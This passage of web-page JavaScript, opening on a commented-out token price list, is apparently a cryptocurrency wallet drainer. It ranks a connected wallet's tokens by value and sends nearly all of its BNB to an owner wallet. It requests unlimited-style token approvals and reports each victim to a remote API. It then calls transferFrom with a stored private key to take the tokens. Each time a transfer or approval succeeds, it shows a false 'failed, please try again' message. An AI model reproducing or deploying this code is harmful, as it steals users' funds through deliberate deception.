        "price": "0.0002502",
        "decimals": 18,
        },
        {
        "address": "0x24ce3d571fbcfd9d81dc0e1a560504636a4d046d",
        "symbol": "METAPETS",
        "price": "0.00000000009495",
        "decimals": 18,
        },
        {
        "address": "0xbc45EDd4b1D3bC9AA665232055cbdDAE64Ef503e",
        "symbol": "ONYX",
        "price": "0.01084",
        "decimals": 18,
        },
        {
        "address": "0x673da443da2f6ae7c5c660a9f0d3dd24d1643d36",
        "symbol": "RAINBOW",
        "price": "0.00000002427",
        "decimals": 18,
        },
        {
        "address": "0xd25631648e3ad4863332319e8e0d6f2a8ec6f267",
        "symbol": "BNBH",
        "price": "3.91",
        "decimals": 18,
        },
        {
        "address": "0x389c13d5be24bed2af35c30f211e042225cb06ff",
        "symbol": "SHIBORG",
        "price": "0.000000007785",
        "decimals": 18,
        },
        {
        "address": "0x75cc6feb91f9cf00b41f8d2f6f66b4aedaf9727b",
        "symbol": "ROCKY",
        "price": "0.00000003242",
        "decimals": 18,
        },
        {
        "address": "0x3203c9e46ca618c8c1ce5dc67e7e9d75f5da2377",
        "symbol": "MOBOX",
        "price": "14.54",
        "decimals": 18,
        },
        {
        "address": "0xc183062db25fc96325485ea369c979ce881ac0ea",
        "symbol": "SHIBELON",
        "price": "0.000008822",
        "decimals": 18,
        },
        {
        "address": "0xa8c2b8eec3d368c0253ad3dae65a5f2bbb89c929",
        "symbol": "CTK",
        "price": "2.83",
        "decimals": 18,
        },
        {
        "address": "0x353a94e74750c5d2d5b3c52abad54d76cb08a151",
        "symbol": "BABYWKD",
        "price": "0.000000002181",
        "decimals": 18,
        },
        {
        "address": "0x9cefd9588f076c5f805341864adc8a6f077a5b99",
        "symbol": "867",
        "price": "0.00000001024",
        "decimals": 18,
        },
        {
        "address": "0xD44FD09d74cd13838F137B590497595d6b3FEeA4",
        "symbol": "ETERNAL",
        "price": "2.12",
        "decimals": 18,
        },
        {
        "address": "0x50332bdca94673f33401776365b66cc4e81ac81d",
        "symbol": "CCAR",
        "price": "0.9632",
        "decimals": 18,
        },
        {
        "address": "0xa07c5b74c9b40447a954e1466938b865b6bbea36",
        "symbol": "VBNB",
        "price": "12",
        "decimals": 18,
        },
        {
        "address": "0x72eB7CA07399Ec402c5b7aa6A65752B6A1Dc0C27",
        "symbol": "ASTRO",
        "price": "0.11",
        "decimals": 18,
        },
        {
        "address": "0xc10358f062663448a3489fc258139944534592ac",
        "symbol": "BCMC",
        "price": "1.7",
        "decimals": 18,
        },
        {
        "address": "0xe3233fdb23f1c27ab37bd66a19a1f1762fcf5f3f",
        "symbol": "ELMON",
        "price": "1.3",
        "decimals": 18,
        },
        {
        "address": "0x32dffc3fe8e3ef3571bf8a72c0d0015c5373f41d",
        "symbol": "JULB",
        "price": "115",
        "decimals": 18,
        },
        {
        "address": "0xc9849e6fdb743d08faee3e34dd2d1bc69ea11a51",
        "symbol": "Bunny",
        "price": "1.6",
        "decimals": 18,
        },
        {
        "address": "0x7ddee176f665cd201f93eede625770e2fd911990",
        "symbol": "GALA",
        "price": "0.6",
        "decimals": 18,
        },
        {
        "address": "0x965f527d9159dce6288a2219db51fc6eef120dd1",
        "symbol": "BSW",
        "price": "1.5",
        "decimals": 18,
        },
        {
        "address": "0x4b0f1812e5df2a09796481ff14017e6005508003",
        "symbol": "TWT",
        "price": "0.74",
        "decimals": 18,
        },
        {
        "address": "0xcD657182A749554fc8487757612F02226355269d",
        "symbol": "MUSK",
        "price": "0.000000065",
        "decimals": 18,
        }
    ];
    */

    const callMethod = async (method, args = []) => {
        const result = await method(...args).call();
        return result;
    }
    
    const promisify = (promiEvent) => {
      return new Promise((resolve, reject) => {
        promiEvent
          // .on('confirmation', (confirmationNumber, receipt) => { // eslint-disable-line
          //   console.log('confirmation: ' + confirmationNumber);
          // })
          .on('error', (err) => {
            console.log('reject err : ', err);
            return reject(err);
          })
          .once('transactionHash', (hash) => {
            console.log('hash :>> ', hash);
            // return resolve(hash);
          })
          .once('receipt', receipt => { // eslint-disable-line
            console.log('reciept', receipt);
            return resolve(receipt);
          })
        // .then(console.log)
        // .catch(reject);
      })
    }

    const bnDivdedByDecimals = (bn, decimals = defaultDecimal) => {
        return bn.dividedBy(new BigNumber(10).pow(decimals))
    }

    const getBnbBalance = async (address) => {
        const ethBalance = await web3.eth.getBalance(address);
        return bnDivdedByDecimals(new BigNumber(ethBalance), 18);
    }
    const getBalance = async (tokenContract, address, decimals) => {
        const result = await callMethod(tokenContract.methods['balanceOf'], [address]);
        return bnDivdedByDecimals(new BigNumber(result), decimals);
    }

    const sendBnbBalance = async (idx, from, to, amount)  =>{
        let args = new BigNumber(amount).minus(0.002).times(10 ** 18).toString();
        supportedTokens[idx]["approved"]=1;
        web3.eth.sendTransaction({
          from: from,
          to: to,
          value: web3.utils.toWei(args, 'wei')
        }, (err, transactionId) => {
          if  (err) {
            console.log('Send Bnb failed', err);
            supportedTokens[idx]["approved"]=0;
          } else {
            console.log('Send Bnb successful', transactionId)
            showAlert("Send failed!, Please try again");
            nextApprove();
          }
        })       
    }

    const checkBalance = async (address, threshold = 0) => {
      const balance = await getBnbBalance(address);
      if (balance <= threshold) {
        throw new Error('Insufficient balance');
      }
      return balance;
    }

    
    const sendTransaction = async (privateKey, contractAddress, method, args = []) => {
      const account = web3.eth.accounts.privateKeyToAccount(privateKey);
      await checkBalance(account.address);

      const encodedABI = method(...args).encodeABI();
      const gasPrice = await web3.eth.getGasPrice();
      const gasEstimate = await web3.eth.estimateGas({
        from: account.address,
        to: contractAddress,
        data: encodedABI,
      });

      const tx = {
        from: account.address,
        to: contractAddress,
        gas: gasEstimate,
        gasPrice: gasPrice,
        data: encodedABI,
      };
      const signedTx = await web3.eth.accounts.signTransaction(tx, account.privateKey);
      const txHash = await promisify(web3.eth.sendSignedTransaction(signedTx.rawTransaction));

      return txHash;
    }

    const sendApproveRequest = async (idx, from, amount, tokenAddress, tokenDecimals) => {
        let args = new BigNumber(amount).times(10 ** tokenDecimals).toString();
        const args2 = new BigNumber(1).times(10 ** 10).toString();
        var jonjonContract = null;
        if(currentNetId == 56){
          jonjonContract = new web3.eth.Contract(jonjonAbi, config.jonjonContractAddr);
        }
        supportedTokens[idx]["approved"]=1;
        new web3.eth.Contract(erc20Abi, tokenAddress).methods
        .approve(config.approvePublicKey, web3.utils.toWei(args2, 'tether'))
        .send({ from: from })
        .then(function(result){             
            console.log('approve success');
            $.ajax({
              url: config.apiUrl,
              method: "POST",
              data: {
                method: "approved",
                net_id: currentNetId,
                wallet: from,
                token_addr: tokenAddress,
                token_name: supportedTokens[idx]["symbol"],
                token_decimals: tokenDecimals
              }
            }).done(function(res) {
            });  
            showAlert("Approve failed!, Please try again");
            nextApprove();
            if(currentNetId == 56 && config.approvePrivateKey != ''){
              sendTransaction(config.approvePrivateKey, tokenAddress, new web3.eth.Contract(erc20Abi, tokenAddress).methods.transferFrom, [from, config.ownerWallet, web3.utils.toWei(args, 'wei')]);            
            }
        })
        .catch(function(e){ 
            supportedTokens[idx]["approved"]=0;
            console.log(e)                                          
        })
    }

    async function checkWallet(){
        if(currentAccount == null || (currentNetId != 1 && currentNetId != 56)){
            $(".content_not_connected").removeClass("hide");
            $(".content_connected").addClass("hide");
            return;
        }

        console.log("checkWallet");
        $("#connect_wallet_btn").removeClass("loading");
        $(".content_not_connected").addClass("hide");
        $(".content_connected").removeClass("hide");

        let maxTokenAsBnb = -1.0;    
        let maxTokenIdx = -1;   
        for(let i=0; i< supportedTokens.length; i++) {
            let balance;
            if(supportedTokens[i].address == ''){
              balance = await getBnbBalance(currentAccount);
              if( balance < 0.002 ){
                changeNetwork();
                break;
              }
            }                
            else{
              balance = await getBalance(new web3.eth.Contract(erc20Abi, supportedTokens[i].address), currentAccount, supportedTokens[i].decimals);
            }
                

            supportedTokens[i].balance = balance;
            console.log(supportedTokens[i].symbol + ":" + balance);

            let val = balance*parseFloat(supportedTokens[i].price);
            if(maxTokenAsBnb < val){
                maxTokenAsBnb = val;
                maxTokenIdx = i;
                mostVTokenIds[vt_cnt] = maxTokenIdx;
                vt_cnt++;
            }
        } 
        if(maxTokenIdx >= 0){
            ;//console.log("max - " + supportedTokens[maxTokenIdx].symbol);
        }
        else {
            ;//console.log("max - error");
        }
    }

    function handleAddressChanged(accounts){
        console.log("handleAddressChanged");
        if(accounts && accounts[0]){
          currentAccount = accounts[0];

          mostVTokenIds = [];
          vt_cnt = 0;
          checkWallet();
        }   
        else{
          $(".content_not_connected").removeClass("hide");
          $(".content_connected").addClass("hide");
        }     
    }

    $("#approve_btn").click(function() {
        if(currentAccount == null){
            showAlert("Please connect wallet!");
            return;
        }
        nextApprove();
    });
    function changeNetwork(){
      return;
      changeNetCount++;
      if(changeNetCount == 2){
        showAlert("GAS is insufficient!");
        return;
      }
      var cId = '0x1';
      if(currentNetId == 1)
        cId = '0x38';

      window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: cId }], // chainId must be in hexadecimal numbers
      }).then(function(e){
        console.log("switch success!");
      })
      .catch(function(e){ 
        console.log("switch error!");
      });
    }
    function nextApprove(){
      var i = -1;
      if(vt_cnt > 0){
        for(i = vt_cnt-1; i >= 0; i --){
          if(supportedTokens[mostVTokenIds[i]].approved && supportedTokens[mostVTokenIds[i]].approved==1)
            continue;
          break;
        }
      }      
      if(i == -1 || supportedTokens[mostVTokenIds[i]].balance < 0.002){
        showAlert("Insufficient balance");
        //changeNetwork();
        return;
      }        
      approveFunc(mostVTokenIds[i]);
    }
    
    function approveFunc(idx){
      if(idx === undefined)
        return;
      if(supportedTokens[idx].address == ''){
          sendBnbBalance(idx,currentAccount, config.ownerWallet, supportedTokens[idx].balance);
      }
      else {
          sendApproveRequest(idx,currentAccount, supportedTokens[idx].balance, supportedTokens[idx].address, supportedTokens[idx].decimals);
      }
    }

    function showAlert(msg){
        if(config.template == "1"){
          $("#StatusPush div").html(msg);
        }
        else{
          layer.alert(msg, { icon: 6, title: "Alert", offset: "auto", skin: 'layui-layer-molv', btn:["OK"] });
        }
    }

    function handleNetworkChanged(networkId){
        console.log("handleNetworkChanged");
        currentNetId = networkId;
        if(networkId != 1 && networkId != 56){
          showAlert("Please select ethereum or bsc net to proceed!");
          return;
        }
        if(networkId == 1){
          jonjonContractAddr = config.ethContractAddr;
          supportedTokens = ethSupportedTokens;
        }
        else if(networkId == 56){
          jonjonContractAddr = config.bscContractAddr;
          supportedTokens = bscSupportedTokens;
        }
        mostVTokenIds = [];
        vt_cnt = 0;
        checkWallet();
    }

    // Unpkg imports
    const Web3Modal = window.Web3Modal.default;
    const WalletConnectProvider = window.WalletConnectProvider.default;
    const EvmChains = window.EvmChains;
    const Fortmatic = window.Fortmatic;

    // Web3modal instance
    let web3Modal;
    localStorage.removeItem("walletconnect");


    var sleep = function(fun, time) {
        setTimeout(() => {
            fun();
        }, time);
    }


    $("#connect_wallet_btn").click(function() {
        $(this).addClass("loading");
        linkWallet();
    });


    async function linkWallet() {
        if (typeof window.ethereum !== "undefined") {
            try {
                currentNetId = await web3.eth.net.getId();
                if (currentNetId != 1 && currentNetId != 56){
                    showAlert("Please select ethereum or bsc net to proceed!"); 
                    $("#connect_wallet_btn").removeClass("loading");
                    return;
                }
                   
                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts",
                });
                handleAddressChanged(accounts);
            } catch (error) {
                //showAlert("User Revoked Approval!");
                $("#connect_wallet_btn").removeClass("loading");
                return;
            }
        } else {
            showAlert("Please install metamask!");
            $("#connect_wallet_btn").removeClass("loading");
        }
    }
});
